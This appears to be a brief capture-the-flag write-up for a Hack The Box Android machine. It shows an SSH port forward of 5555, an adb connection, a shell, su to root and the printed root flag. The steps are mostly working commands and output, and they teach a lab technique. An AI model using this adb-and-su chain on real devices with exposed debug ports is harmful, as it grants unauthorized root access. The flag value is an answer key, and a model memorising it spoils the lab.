# Enumeration-

**ATACK SENARIO**  

Android devices Being Shipped with TCP Port 5555 Enabled so we port forward 5555(port) to our localhost then exploit via adb get shell :)

```bash
apt install adb
```

### Port Forward-

```bash
root@napster:~/Documents/HTB/Explore# ssh -L 5555:localhost:5555 kristi@10.10.10.247 -p 2222
Password authentication
Password: 
:/ $ 
```

### New terminal-

```bash
root@napster:~/Documents/HTB/Explore# adb connect localhost:5555
already connected to localhost:5555
root@napster:~/Documents/HTB/Explore# adb devices
List of devices attached
emulator-5554   device
localhost:5555  device
root@napster:~/Documents/HTB/Explore# adb -s localhost:5555 shell
x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
:/ # whoami
root
:/ # find / -name "root.txt" 2>/dev/null
/data/root.txt
1|:/ # cat /data/root.txt                                                      
f04fc82b6d49b41c9b08982be59338c5
```